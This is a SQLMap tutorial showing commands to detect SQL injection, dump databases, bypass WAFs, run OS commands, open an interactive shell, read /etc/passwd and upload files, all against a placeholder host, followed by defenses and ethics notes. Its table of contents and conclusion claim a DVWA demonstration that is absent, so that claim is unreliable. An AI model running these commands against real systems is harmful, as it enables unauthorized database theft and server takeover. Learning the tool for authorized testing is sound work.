# SQLMap Complete Tutorial with Practical Demonstration

## Table of Contents
1. [Introduction to SQLMap](#introduction-to-sqlmap)
2. [Installation](#installation)
3. [Basic Commands](#basic-commands)
4. [Practical Demonstration on DVWA](#practical-demonstration-on-dvwa)
5. [Proof of Work](#proof-of-work)
6. [Advanced Techniques](#advanced-techniques)
7. [Defense Mechanisms](#defense-mechanisms)
8. [Ethical Considerations](#ethical-considerations)

## Introduction to SQLMap

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches for database fingerprinting, data fetching, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

## Installation

SQLMap is pre-installed on Kali Linux. For other systems:

```bash
# Clone the latest version from GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Or install via package manager (Kali/Ubuntu)
sudo apt update && sudo apt install sqlmap
```

## Basic Commands

### Basic URL Testing
```bash
sqlmap -u "http://example.com/page.php?id=1"
```

### Testing with POST Data
```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"
```

### Testing with Cookies
```bash
sqlmap -u "http://example.com/restricted/page.php" --cookie="PHPSESSID=abc123"
```

### Specifying HTTP Method
```bash
sqlmap -u "http://example.com/api/user" --method=PUT --data="id=1"
```

### Database Enumeration
```bash
# List databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# List tables in a specific database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# List columns in a specific table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

# Dump data from specific columns
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
```

### Advanced Options
```bash
# Specify user-agent
sqlmap -u "http://example.com/page.php?id=1" --user-agent="SQLMAP"

# Use random user-agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Use proxy
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Set delay between requests
sqlmap -u "http://example.com/page.php?id=1" --delay=5

# Set timeout
sqlmap -u "http://example.com/page.php?id=1" --timeout=30

# Retry on failure
sqlmap -u "http://example.com/page.php?id=1" --retries=3
```


### Bypassing WAFs
```bash
# Use tamper scripts to bypass WAFs
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment

# Use multiple tamper scripts
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,between
```

### OS Interaction
```bash
# Execute operating system commands
sqlmap -u "http://example.com/page.php?id=1" --os-cmd="whoami"

# Get an interactive OS shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell
```

### File System Access
```bash
# Read files from the server
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Upload files to the server
sqlmap -u "http://example.com/page.php?id=1" --file-write="local.txt" --file-dest="remote.txt"
```

## Defense Mechanisms

To protect against SQL injection attacks:

1. **Use Prepared Statements** (Parameterized Queries)
2. **Implement Input Validation**
3. **Apply the Principle of Least Privilege** to database accounts
4. **Use Web Application Firewalls** (WAFs)
5. **Regularly Update and Patch** systems
6. **Implement Proper Error Handling** (don't expose database errors to users)
7. **Conduct Regular Security Audits** and penetration testing

## Ethical Considerations

1. Always obtain proper authorization before testing any system
2. SQLMap should only be used on systems you own or have permission to test
3. Unauthorized access to computer systems is illegal
4. DVWA is designed for educational purposes in controlled environments
5. Respect privacy and confidentiality of any data encountered during testing

## Conclusion

SQLMap is a powerful tool for detecting and exploiting SQL injection vulnerabilities. This tutorial demonstrated its basic usage through a practical example on DVWA. Remember to always use this tool ethically and legally, and to implement proper security measures to protect your own applications from such vulnerabilities.

For more information, refer to the [official SQLMap documentation](https://github.com/sqlmapproject/sqlmap/wiki).